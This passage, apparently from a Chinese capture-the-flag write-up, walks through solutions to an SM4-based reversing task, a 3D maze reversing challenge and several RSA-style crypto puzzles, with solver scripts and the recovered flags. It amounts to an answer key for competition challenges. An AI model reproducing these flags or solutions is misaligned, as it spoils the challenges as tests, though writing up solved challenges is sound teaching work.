0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279] # 将 128bit 拆分成 4x32bit for i in range(4): temp = int.from_bytes(key[4 * i:4 * i + 4], 'big') key_temp[i] = temp ^ FK[i] # 循环生成轮密钥 for i in range(32): box_in = key_temp[1] ^ key_temp[2] ^ key_temp[3] ^ CK[i] box_out = self._s_box(box_in) key_r[i] = key_temp[0] ^ box_out ^ self._rot_left(box_out, 13) ^ self._rot_left(box_out, 23) key_temp = key_temp[1:] + [key_r[i]] return key_r @staticmethod def _s_box(n: int): BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] result = bytearray() # 将 32bit 拆分成 4x8bit，依次进行S盒变换 for item in list(n.to_bytes(4, 'big')): result.append(BOX[item]) return int.from_bytes(result, 'big') @staticmethod def _rot_left(n, m): &quot;&quot;&quot;循环左移&quot;&quot;&quot; return ((n &lt;&lt; m) | (n &gt;&gt; (32 - m))) &amp; 0xFFFFFFFFkey = bytes.fromhex(&quot;68677f4e555b4e777b65785b4c726f6f&quot;) # 128bit密钥plaintext = bytes.fromhex(&quot;00112233445566778899aabbccddeeff&quot;) # 128bit明文sm4 = SM4Cipher(key)print(sm4.encrypt(plaintext).hex()) #from Crypto.Util.number import *#5C89EEF56FC54492DBE3AE9CB54F4AF4E7A35E0FFC93FC766CFB29E0162FA567print(sm4.decrypt(long_to_bytes(0x5C89EEF56FC54492DBE3AE9CB54F4AF4E7A35E0FFC93FC766CFB29E0162FA567)))s=b'Nh5XOXC\\x7fv4eSccYi6Xv^Y6hXrocXEs`&amp;'a=[]for i in range(0,32): a.append(s[i])for i in range(0,32,2): a[i]^=6for i in range(1,32,2): a[i]^=7print(bytearray(a))#Ho3_I_Exp3cTed_n0_pY_1n_the_Ctf! Mazeeee（找屎的题） 32位程序，ida载入 if ( v5 == 22 ) { v18 = 0; while ( 2 ) // 22步数 { if ( v18 &gt;= 22 ) { if ( off_3E0074[150 * dword_3E0284 + 15 * dword_3E027C + unk_3E0248] == 'E' ) { v15 = v4; v6 = sub_3D13D4(v4, input); sub_3D1316(v4[0]); // 进一步的check }/*查看地图一共750B，结合150*z+15*y+x判断为三维迷宫 15*10*5 且在22步从00到终点*/ v6 = (v6 - 'S'); switch ( v6 ) { case 0u: --dword_3E0284; ... case 4u: ++dword_3E0284; ... case 0xEu: --unk_3E0248; ...//等推导出如何对(x,y,z)进行移动 }&quot;&quot;&quot;S 下一层 W 上一层 a 左移动1d 右边移动2 s 向上一行w 向下两行&quot;&quot;&quot; 打印出地图，三维迷宫路径上只能为O或E，从S出发最终到E，走22步到达，路径规模比较小，直接手过迷宫即可。 S # O # # # # # # O # # # # # # # # O # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # O # # # # # # # # # # # # # # # # # # # # # # # # # # # # # O # # O # # # # # # # # # # O # # # # # # # # # # # # # # # # # # # # # O # # # # # # # # # # # # # # # # # # # # O # # # O # # # # # O # # # # # # # # # # # # # # O # # # # # O # # # O # # # # # # # # # # # # # O # # # # # # # # # # # # # # O # O O # # # # # # # # # # # # # # # # # # # # # # # # # O # # # # # # # # # # # # # # # O # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # O # # # # # # O # # # # # # # # # # # # # # # O # # # # # # O # # # # # # # # # # # # # # # # # # # # # # # # O O # # # O # O # O O O # # # # # # # # # # # # # # # # # # # # O # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # O # # # # # O # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # O # # # # # # # # # # # # # O # # # # # # # # # # # # # O # # # # # # # # # # # # # # O # # # # # O # # # # # # # # # # # # # # # O O # # # # # # # # # # # # # # # O # # # # # # # O # # # # E # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # O # # # # # # # # # # # O # # O # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # O O # # # # # # # # # # # O O O # # # # # # # # # # # # # # # # O # # # # # # # # # # O # # # O # # # # # # # # # # # # # # O # # # # # # # # # # O # O # O # O # # # # # O # # # # # # # # # # # //dWWwwdddWWaawwddsssSaw 调试程序下载msvcr100d.dll最新版放在同目录下，下断点到有congratulation处。 for ( i = 0; i &lt; 44; ++i ) { v1 = sub_3D13ED(&amp;a1); // v1是长度 v2 = sub_3D1262(&amp;a1, i % v1); sub_3D14AB(byte_3E024C[i] ^ *v2); // v2是输入的迷宫路径 }//byte_3E024C全为0，交叉引用发现另一处变化。void __stdcall sub_3D1D80(){ int i; // [esp+D0h] [ebp-8h] for ( i = 1; i &lt; 44; ++i ) byte_3E0000[i] = byte_3E024B[i] &amp; 0xE0 | byte_3E024C[i] &amp; 0x1F; byte_3E0000[0] = byte_3E0277 &amp; 0xE0 | byte_3E024C[0] &amp; 0x1F;}//已知byte_3E0000，反求右侧，这里直接用z3求解 如下: from z3 import *kk=[BitVec('a%d'%i,8) for i in range(44)]enc=[0x0E, 0x5D, 0x7D, 0x7D, 0x5D, 0x4E, 0x4E, 0x4E, 0x5D, 0x7D, 0x6B, 0x4B, 0x5D, 0x5D, 0x4E, 0x4E, 0x59, 0x59, 0x59, 0x59, 0x6B, 0x5D, 0x53, 0x24, 0x7B, 0x34, 0x07, 0x49, 0x01, 0x1B, 0x23, 0x27, 0x7E, 0x35, 0x3F, 0x12, 0x1B, 0x29, 0x32, 0x09, 0x16, 0x12, 0x60, 0x4A]tmp=[0]*44s=Solver()for i in range(1,44): tmp[i]=(kk[i-1]&amp;0xe0)| (kk[i]&amp;0x1f) s.add(tmp[i]==enc[i])tmp[0]=kk[0]&amp;0x1fs.add(tmp[0]==enc[0])s.check()m=s.model()key=[]for i in range(44): key.append(m[kk[i]].as_long())print()for i in range(22): print(chr(ord(b[i])^key[i+22]),end='')#W3lc0me_t0_The_Maze!!} 这样拿到flag后半段是对的，前半段根据hint在strings窗口查看，发现一串base64，直接解码是乱码，对base64表交叉引用发现表经过了变化，即base64换表，写脚本还原即可。 &quot;&quot;&quot; for ( j = 0; j &lt; 63; j += 2 ) sub_3D121C(&amp;byte_3E0030[j], &amp;basetable[j]);// 交换函数 &quot;&quot;&quot; import base64base='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'new=''for i in range(0,63,2): new+=base[i+1]+base[i]enc='QCAmN2sYNGUfR3EvOUMuNWYkW3k1JR=='c=''for i in range(len(enc)): if enc[i] in new: c+=base[new.index(enc[i])] else: c+='='print(c)print(base64.b64decode(c)) #D0g3{Y0u^Can=So1ve_it!#flag：D0g3{Y0u^Can=So1ve_it!W3lc0me_t0_The_Maze!!} Cryptolittle_trick 签到题，给了p,q,c但是没给e,分别按位加密了dp,dq,只需要挨个还原即可，需要注意的是加密dq那儿是py2,需要用py2跑随机数，还原dp,dq再已知dp,dq,p,q解密。 p=119494148343917708105807117614773529196380452025859574123211538859983094108015678321724495609785332508563534950957367289723559468197440246960403054020452985281797756117166991826626612422135797192886041925043855329391156291955066822268279533978514896151007690729926904044407542983781817530576308669792533266431q=125132685086281666800573404868585424815247082213724647473226016452471461555742194042617318063670311290694310562746442372293133509175379170933514423842462487594186286854028887049828613566072663640036114898823281310177406827049478153958964127866484011400391821374773362883518683538899757137598483532099590137741c=10238271315477488225331712641083290024488811710093033734535910573493409567056934528110845049143193836706122210303055466145819256893293429223389828252657426030118534127684265261192503406287408932832340938343447997791634435068366383965928991637536875223511277583685579314781547648602666391656306703321971680803977982711407979248979910513665732355859523500729534069909408292024381225192240385351325999798206366949106362537376452662264512012770586451783712626665065161704126536742755054830427864982782030834837388544811172279496657776884209756069056812750476669508640817369423238496930357725842768918791347095504283368032from Crypto.Util.number import * import randomimport gmpy2import osdq=23458591381644494879596426183878928641891759871602961070839457303969747353773411708437315165237216481430908369709167907047043280248152040749469402814146054871536032870746473649690743697560576735624528397398691515920649222501258921802372365480019200479555430922883680472732415240714991623845227274793947921407dp=104137587579880166582178434901328539485184135240660490271571544307637817287517428663992284342411864826922600858353966205614398977234519495034539643954586905495941906386407181383904043194285771983919780892934288899562700746832428876894943676937141813284454381136254907871626581989544814547778881240129496262777def decrypt(p,q,dq,dp,c): n = p*q phi = (p-1)*(q-1) dd = gmpy2.gcd(p-1, q-1) d=(dp-dq)//dd * gmpy2.invert((q-1)//dd, (p-1)//dd) * (q-1) +dq m = pow(c, d, n) print(long_to_bytes(m))decrypt(p,q,dp,dq,c)#D0g3{Welc0me_t0_iSOON_4nd_have_4_go0d_time}'''result=[1, 0, 7789, 1, 17598, 20447, 15475, 23040, 41318, 23644, 53369, 19347, 66418, 5457, 0, 1, 14865, 97631, 6459, 36284, 79023, 1, 157348, 44667, 185701, 116445, 23809, 220877, 0, 1, 222082, 30333, 55446, 207442, 193806, 149389, 173229, 349031, 152205, 1, 149157, 196626, 1, 222532, 10255, 46268, 171536, 0, 351788, 152678, 0, 172225, 109296, 0, 579280, 634746, 1, 668942, 157973, 1, 17884, 662728, 759841, 450490, 0, 139520, 157015, 616114, 199878, 154091, 1, 937462, 675736, 53200, 495985, 307528, 1, 804492, 790322, 463560, 520991, 436782, 762888, 267227, 306436, 1051437, 384380, 505106, 729384, 1261978, 668266, 1258657, 913103, 935600, 1, 1, 401793, 769612, 484861, 1024896, 517254, 638872, 1139995, 700201, 308216, 333502, 0, 0, 401082, 1514640, 667345, 1015119, 636720, 1011683, 795560, 783924, 1269039, 5333, 0, 368271, 1700344, 1, 383167, 7540, 1490472, 1484752, 918665, 312560, 688665, 967404, 922857, 624126, 889856, 1, 848912, 1426397, 1291770, 1669069, 0, 1709762, 130116, 1711413, 1336912, 2080992, 820169, 903313, 515984, 2211283, 684372, 2773063, 391284, 1934269, 107761, 885543, 0, 2551314, 2229565, 1392777, 616280, 1368347, 154512, 1, 1668051, 0, 2453671, 2240909, 2661062, 2880183, 1376799, 0, 2252003, 1, 17666, 1, 2563626, 251045, 1593956, 2215158, 0, 93160, 0, 2463412, 654734, 1, 3341062, 3704395, 3841103, 609968, 2297131, 1942751, 3671207, 1, 1209611, 3163864, 3054774, 1055188, 1, 4284662, 3647599, 247779, 0, 176021, 3478840, 783050, 4613736, 2422927, 280158, 2473573, 2218037, 936624, 2118304, 353989, 3466709, 4737392, 2637048, 4570953, 1473551, 0, 0, 4780148, 3299784, 592717, 538363, 2068893, 814922, 2183138, 2011758, 2296545, 5075424, 1814196, 974225, 669506, 2756080, 5729359, 4599677, 5737886, 3947814, 4852062, 1571349, 4123825, 2319244, 4260764, 1266852, 1, 3739921, 1, 5948390, 1, 2761119, 2203699, 1664472, 3182598, 6269365, 5344900, 454610, 495499, 6407607, 1, 1, 476694, 4339987, 5642199, 1131185, 4092110, 2802555, 0, 5323448, 1103156, 2954018, 1, 1860057, 128891, 2586833, 6636077, 3136169, 1, 3280730, 6970001, 1874791, 48335, 6229468, 6384918, 5412112, 1, 7231540, 7886316, 2501899, 8047283, 2971582, 354078, 401999, 6427168, 4839680, 1, 44050, 3319427, 0, 1, 1452967, 4620879, 5525420, 5295860, 643415, 5594621, 951449, 1996797, 2561796, 6707895, 7072739]ll=len(result)list_p = sieve_base[0:ll]list_q = sieve_base[ll:2*ll]dq=''for i in range(ll): p=list_p[i] q=list_q[i] f=False for j in range(10): if pow(j,65537,p*q)==result[i]: dq+=str(j) f=True break if not f: print('error') print(dq)''''''#py2import randomseeds=[3, 0, 39, 78, 14, 49, 73, 83, 55, 48, 30, 28, 23, 16, 54, 23, 68, 7, 20, 8, 98, 68, 45, 36, 97, 13, 83, 68, 16, 59, 81, 26, 51, 45, 36, 60, 36, 94, 58, 11, 19, 33, 95, 12, 60, 38, 51, 95, 21, 3, 38, 72, 47, 80, 7, 20, 26, 80, 18, 43, 92, 4, 64, 93, 91, 12, 86, 63, 46, 73, 89, 5, 91, 17, 88, 94, 80, 42, 90, 14, 45, 53, 91, 16, 28, 81, 62, 63, 66, 20, 81, 3, 43, 99, 54, 22, 2, 27, 2, 62, 88, 99, 78, 25, 76, 49, 28, 96, 95, 57, 94, 53, 32, 58, 32, 72, 89, 15, 4, 78, 89, 74, 86, 45, 51, 65, 13, 75, 95, 42, 20, 77, 34, 66, 56, 20, 26, 18, 28, 11, 88, 62, 72, 27, 74, 42, 63, 76, 82, 97, 75, 92, 1, 5, 20, 78, 46, 85, 81, 54, 64, 87, 37, 91, 38, 39, 1, 90, 61, 28, 13, 60, 37, 90, 87, 15, 78, 91, 99, 58, 62, 73, 70, 56, 82, 5, 19, 54, 76, 88, 4, 3, 55, 3, 3, 22, 85, 67, 98, 28, 32, 42, 48, 96, 69, 3, 83, 48, 26, 20, 45, 16, 45, 47, 92, 0, 54, 4, 73, 8, 31, 38, 3, 10, 84, 60, 59, 69, 64, 91, 98, 73, 81, 98, 9, 70, 44, 44, 24, 95, 83, 49, 31, 19, 89, 18, 20, 78, 86, 95, 83, 23, 42, 51, 95, 80, 48, 46, 88, 7, 47, 64, 55, 4, 62, 37, 71, 75, 98, 67, 98, 58, 66, 70, 24, 58, 56, 44, 11, 78, 1, 78, 89, 97, 83, 72, 98, 12, 41, 33, 14, 40, 27, 5, 18, 35, 25, 31, 69, 97, 84, 47, 25, 90, 78, 15, 72, 71]rand='[54, 36, 60] [84, 42, 25] [20, 38, 39] [81, 9, 92] [70, 65, 94] [6, 11, 75] [27, 50, 46] [49, 85, 8] [95, 14, 73] [54, 71, 30] [53, 28, 65] [11, 13, 59] [94, 89, 8] [36, 41, 44] [91, 13, 48] [92, 94, 89] [94, 74, 90] [32, 65, 7] [90, 68, 90] [22, 96, 12] [83, 35, 5] [74, 74, 90] [27, 48, 33] [32, 98, 95] [80, 37, 84] [25, 68, 84] [49, 85, 37] [74, 94, 74] [48, 41, 44] [22, 94, 2] [50, 45, 38] [74, 20, 20] [50, 16, 82] [27, 8, 33] [32, 98, 91] [30, 57, 26] [98, 95, 91] [54, 28, 43] [58, 20, 94] [45, 55, 92] [78, 52, 51] [57, 81, 27] [76, 51, 53] [47, 65, 66] [57, 26, 80] [63, 72, 6] [24, 50, 82] [76, 51, 99] [68, 63, 47] [23, 36, 60] [63, 42, 6] [7, 59, 98] [43, 45, 34] [27, 70, 95] [32, 15, 7] [90, 68, 76] [20, 20, 60] [27, 70, 95] [18, 66, 19] [3, 69, 14] [56, 55, 58] [23, 39, 15] [47, 63, 92] [91, 49, 56] [17, 68, 16] [47, 66, 14] [79, 3, 31] [44, 29, 90] [39, 58, 85] [27, 56, 46] [8, 60, 14] [62, 74, 79] [17, 68, 16] [52, 96, 28] [39, 18, 62] [54, 12, 28] [54, 70, 95] [63, 27, 22] [20, 9, 58] [10, 70, 65] [48, 8, 33] [61, 45, 71] [8, 17, 16] [36, 48, 41] [13, 59, 17] [50, 55, 38] [92, 17, 23] [44, 29, 90] [43, 24, 44] [90, 76, 90] [50, 45, 38] [23, 54, 36] [69, 14, 46] [40, 17, 24] [91, 13, 48] [95, 14, 2] [94, 5, 8] [64, 95, 19] [95, 94, 8] [92, 17, 97] [18, 90, 62] [40, 17, 24] [81, 9, 73] [37, 92, 84] [95, 20, 29] [6, 11, 75] [11, 13, 17] [37, 90, 39] [51, 99, 53] [4, 1, 51] [54, 12, 43] [61, 89, 45] [21, 30, 90] [58, 64, 94] [7, 21, 90] [7, 59, 98] [60, 99, 14] [96, 73, 15] [23, 10, 15] [81, 9, 92] [60, 99, 14] [85, 11, 12] [79, 3, 31] [27, 48, 8] [50, 16, 82] [41, 84, 44] [25, 68, 84] [45, 43, 4] [51, 99, 53] [63, 27, 22] [90, 68, 90] [79, 32, 24] [58, 84, 89] [7, 24, 44] [96, 55, 52] [90, 68, 76] [20, 20, 60] [18, 33, 19] [11, 13, 17] [45, 55, 92] [18, 90, 62] [92, 97, 23] [7, 59, 34] [64, 70, 95] [51, 11, 12] [63, 27, 22] [44, 29, 48] [37, 95, 20] [48, 50, 96] [19, 37, 84] [45, 43, 76] [42, 56, 55] [84, 76, 25] [62, 79, 94] [90, 68, 90] [81, 9, 92] [39, 58, 85] [19, 10, 90] [50, 45, 38] [91, 13, 55] [63, 40, 92] [14, 83, 54] [68, 9, 84] [8, 17, 68] [42, 72, 6] [20, 19, 39] [13, 84, 25] [20, 9, 65] [55, 80, 32] [11, 59, 17] [25, 68, 84] [30, 57, 26] [9, 61, 84] [20, 65, 58] [14, 18, 54] [96, 1, 73] [9, 92, 73] [8, 68, 16] [40, 20, 24] [58, 20, 64] [17, 97, 23] [27, 56, 46] [90, 29, 13] [96, 55, 47] [48, 50, 96] [62, 79, 94] [67, 78, 51] [91, 13, 55] [95, 20, 29] [39, 90, 62] [23, 10, 15] [23, 54, 36] [95, 14, 73] [23, 36, 60] [23, 54, 60] [95, 14, 2] [61, 10, 90] [7, 97, 41] [35, 83, 5] [11, 13, 59] [21, 30, 90] [63, 27, 22] [54, 13, 30] [37, 90, 39] [9, 16, 60] [23, 36, 60] [49, 85, 37] [54, 13, 71] [20, 20, 60] [90, 76, 90] [27, 48, 33] [36, 48, 41] [48, 8, 33] [35, 45, 34] [42, 56, 58] [84, 75, 42] [13, 55, 48] [23, 39, 15] [27, 50, 46] [22, 96, 12] [11, 39, 68] [63, 72, 6] [23, 54, 60] [57, 42, 57] [91, 3, 0] [30, 26, 80] [22, 93, 2] [68, 9, 16] [63, 40, 92] [8, 68, 16] [35, 83, 5] [27, 50, 56] [45, 55, 38] [35, 35, 5] [46, 37, 86] [90, 29, 45] [54, 86, 17] [40, 86, 17] [71, 83, 99] [76, 51, 99] [85, 8, 37] [6, 11, 75] [1, 11, 68] [67, 78, 52] [60, 99, 14] [18, 33, 19] [90, 68, 90] [81, 9, 92] [3, 83, 31] [76, 99, 53] [49, 85, 37] [92, 94, 89] [2, 27, 22] [24, 16, 82] [76, 51, 53] [27, 54, 70] [13, 71, 30] [88, 58, 85] [39, 18, 62] [32, 15, 65] [43, 45, 34] [47, 40, 92] [9, 95, 73] [23, 10, 39] [17, 97, 23] [68, 61, 84] [32, 62, 98] [45, 43, 4] [83, 35, 5] [7, 97, 41] [35, 83, 5] [58, 20, 64] [43, 24, 44] [90, 45, 13] [71, 83, 99] [58, 20, 64] [55, 47, 52] [40, 86, 17] [45, 55, 46] [81, 9, 92] [84, 76, 25] [81, 92, 73] [8, 60, 14] [19, 80, 37] [85, 8, 37] [7, 98, 34] [35, 83, 5] [47, 65, 66] [23, 16, 91] [57, 81, 27] [10, 70, 94] [45, 87, 3] [70, 95, 19] [62, 79, 94] [18, 66, 19] [54, 75, 74] [92, 84, 21] [1, 39, 68] [68, 9, 60] [19, 80, 37] [91, 3, 0] [35, 45, 34] [37, 92, 21] [20, 9, 65] [9, 92, 73] [96, 73, 15] [7, 59, 34] [32, 62, 0]'result=[-38, -121, -40, -125, -51, -29, -2, -21, -59, -54, -51, -40, -105, -5, -4, -50, -127, -56, -124, -128, -23, -104, -63, -112, -34, -115, -58, -99, -24, -102, -1, -5, -34, -3, -104, -103, -21, -62, -121, -24, -115, -9, -87, -56, -39, -30, -34, -4, -33, -5, -114, -21, -19, -7, -119, -107, -115, -6, -25, -27, -32, -62, -28, -20, -60, -121, -102, -10, -112, -7, -85, -110, -62, -100, -110, -29, -41, -55, -113, -112, -45, -106, -125, -25, -57, -27, -83, -2, -51, -118, -2, -10, -50, -40, -1, -82, -111, -113, -50, -48, -23, -33, -112, -38, -29, -26, -4, -40, -123, -4, -44, -120, -63, -38, -41, -22, -50, -50, -17, -122, -61, -5, -100, -22, -44, -47, -125, -125, -127, -55, -117, -100, -2, -26, -32, -111, -123, -118, -16, -24, -20, -40, -92, -40, -102, -49, -99, -45, -59, -98, -49, -13, -62, -128, -121, -114, -112, -13, -3, -4, -26, -35, -15, -35, -8, -18, -125, -14, -6, -60, -113, -104, -120, -64, -104, -55, -104, -41, -34, -106, -105, -2, -28, -14, -58, -128, -3, -1, -17, -38, -18, -12, -59, -4, -19, -82, -40, -122, -18, -42, -53, -60, -113, -40, -126, -15, -63, -40, -124, -114, -58, -26, -35, -26, -8, -48, -112, -52, -11, -117, -52, -32, -21, -38, -124, -13, -103, -6, -30, -33, -28, -31, -1, -97, -59, -64, -28, -1, -40, -2, -10, -26, -24, -3, -50, -113, -125, -122, -124, -5, -50, -62, -11, -8, -88, -109, -7, -31, -105, -54, -28, -8, -62, -58, -101, -58, -53, -124, -18, -124, -17, -109, -52, -45, -40, -109, -85, -7, -108, -121, -58, -49, -91, -102, -8, -10, -17, -55, -19, -11, -116, -47, -120, -121, -23, -99, -19, -51, -36, -110, -126, -29, -110, -9, -97, -54, -83, -86]l=len(result)rand=[]dp=''for j in range(0,l): random.seed(seeds[j]) rands=[] for k in range(0,4): rands.append(random.randint(0,99)) rand.append(rands) x=rands[j%4] f=False for i in range(255): if (~i|rands[j%4]) &amp; (i|~rands[j%4]) ==result[j]: dp+=chr(i) f=True if not f: print('error')print(dp)''' ez_equation 给了一个方程，我们设三个未知数为a,b,c，那么M1=a*a*b+b*b*a+b*b+a*b M2=b*b*(c+1)+a*b*(c+1)-2 首先gcd(M1,M2+2)=kb 那么gcd(kb,b)=b 先求出b,然后M1,M2两个方程两个未知数，用z3直接梭出a,c 最后还有两个因子是相邻的，直接扔yafu或者开方取前后两个素数 最后再rsa解密 M1= 3826382835023788442651551584905620963555468828948525089808250303867245240492543151274589993810948153358311949129889992078565218014437985797623260774173862776314394305207460929010448541919151371739763413408901958357439883687812941802749556269540959238015960789123081724913563415951118911225765239358145144847672813272304000303248185912184454183649550881987218183213383170287341491817813853157303415010621029153827654424674781799037821018845093480149146846916972070471616774326658992874624717335369963316741346596692937873980736392272357429717437248731018333011776098084532729315221881922688633390593220647682367272566275381196597702434911557385351389179790132595840157110385379375472525985874178185477024824406364732573663044243615168471526446290952781887679180315888377262181547383953231277148364854782145192348432075591465309521454441382119502677245090726728912738123512316475762664749771002090738886940569852252159994522316M2= 4046011043117694641224946060698160981194371746049558443191995592417947642909277226440465640195903524402898673255622570650810338780358645872293473212692240675287998097280715739093285167811740252792986119669348108850168574423371861266994630851360381835920384979279568937740516573412510564312439718402689547377548575653450519989914218115265842158616123026997554651983837361028152010675551489190669776458201696937427188572741833635865019931327548900804323792893273443467251902886636756173665823644958563664967475910962085867559357008073496875191391847757991101189003154422578662820049387899402383235828011830444034463049749668906583814229827321704450021715601349950406035896249429068630164092309047645766216852109121662629835574752784717997655595307873219503797996696389945782836994848995124776375146245061787647756704605043856735398002012276311781956668212776588970619658063515356931386886871554860891089498456646036630114620806n=19445950132976386911852381666731799463510958712950274248183192405937223343228119407660772413067599252710235310402278345391806863116119010697766434743302798644091220730819441599784039955347398797545219314925103529062092963912855489464914723588833817280786158985269401131919618320866942737291915603551320163001129725430205164159721810319128999027215168063922977994735609079166656264150778896809813972275824980250733628895449444386265971986881443278517689428198251426557591256226431727934365277683559038777220498839443423272238231659356498088824520980466482528835994554892785108805290209163646408594682458644235664198690503128767557430026565606308422630014285982847395405342842694189025641950775231191537369161140012412147734635114986068452144499789367187760595537610501700993916441274609074477086105160306134590864545056872161818418667370690945602050639825453927168529154141097668382830717867158189131567590506561475774252148991615602388725559184925467487450078068863876285937273896246520621965096127440332607637290032226601266371916124456122172418136550577512664185685633131801385265781677598863031205194151992390159339130895897510277714768645984660240750580001372772665297920679701044966607241859495087319998825474727920273063120701389749480852403561022063673222963354420556267045325208933815212625081478538158049144348626000996650436898760300563194390820694376019146835381357141426987786643471325943646758131021529659151319632425988111406974492951170237774415667909612730440407365124264956213064305556185423432341935847320496716090528514947from gmpy2 import *from Crypto.Util.number import *b=int(gcd(M1,M2+2))b=int(gcd(b,n))print(b)'''from z3 import *s=Solver()a,c=Ints('a c')s.add(a*a*b+b*b*a+b*b+a*b==M1)s.add(b*b*(c+1)+a*b*(c+1)-2==M2)if s.check()==sat: print(s.model())'''c=124117415943883977664751123530312411127969752596554845224788157371311249476587435058606174560086595402130942432433077285727410486606936603436679072115481556559754023776771158788066029212482977191449912364572356973349619609634451941137428490832382800157920373064845282558903378297473815085357523566726409862651a=117379993488408909213785887974472229016071265566403849836216754847295401565166151872329440545598767396499252325133419296775798211888305050776586647999185549171166433935032159605367762650398185050063643611720499373962310459705000471248897299568458251778545586376091559089442503748421906239117101764062329447353assert n%(a*b*c)==0p_q=n//(a*b*c)print(p_q)p=100879187056056327845688098549406745424207361197423093269692717108477600868962896860013904736765795306101216828969899092854909669522132180587302621989436957151756194757478353967989066938767945991388791271155482274102738851937877875741607885045831857778368069892408823414883083227349949611641923542904479147403q=100879187056056327845688098549406745424207361197423093269692717108477600868962896860013904736765795306101216828969899092854909669522132180587302621989436957151756194757478353967989066938767945991388791271155482274102738851937877875741607885045831857778368069892408823414883083227349949611641923542904479146623phi=(p-1)*(q-1)*(a-1)*(b-1)*(c-1)assert n==a*b*c*p*qd=invert(0x10001,phi)c=1394946766416873131554934453357121730676319808212515786127918041980606746238793432614766163520054818740952818682474896886923871330780883504028665380422608364542618561981233050210507202948882989763960702612116316321009210541932155301216511791505114282546592978453573529725958321827768703566503841883490535620591951871638499011781864202874525798224508022092610499899166738864346749753379399602574550324310119667774229645827773608873832795828636770263111832990012205276425559363977526114225540962861740929659841165039419904164961095126757294762709194552018890937638480126740196955840656602020193044969685334441405413154601311657668298101837066325231888411018908300828382192203062405287670490877283269761047853117971492197659115995537837080400730294215778540754482680476723953659085854297184575548489544772248049479632420289954409052781880871933713121875562554234841599323223793407272634167421053493995795570508435905280269774274084603687516219837730100396191746101622725880529896250904142333391598426588238082485305372659584052445556638990497626342509620305749829144158797491411816819447836265318302080212452925144191536031249404138978886262136129250971366841779218675482632242265233134997115987510292911606736878578493796260507458773824689843424248233282828057027197528977864826149756573867022173521177021297886987799897923182290515542397534652789013340264587028424629766689059507844211910072808286250914059983957934670979551428204569782238857331272372035625901349763799005621577332502957693517473861726359829588419409120076625939502382579605m=pow(c,d,n)print(long_to_bytes(m)[256:])#D0g3{296b680c-7aeb-5272-8b33-7335b411fbcb} Strange加密的是m|hint,给了m&amp;hint和hint 首先根据hint和m&amp;hint可以知道m中哪些比特为1 然后这些已知为1的比特，设其它未知的比特为x,那么满足copper已知部分明文攻击，求出m|hint，所以最后当m&amp;hint为比特位为1则m对应位为1，当m|hint为1且hint为0则m对应位为1,综上可以还原m所有比特位 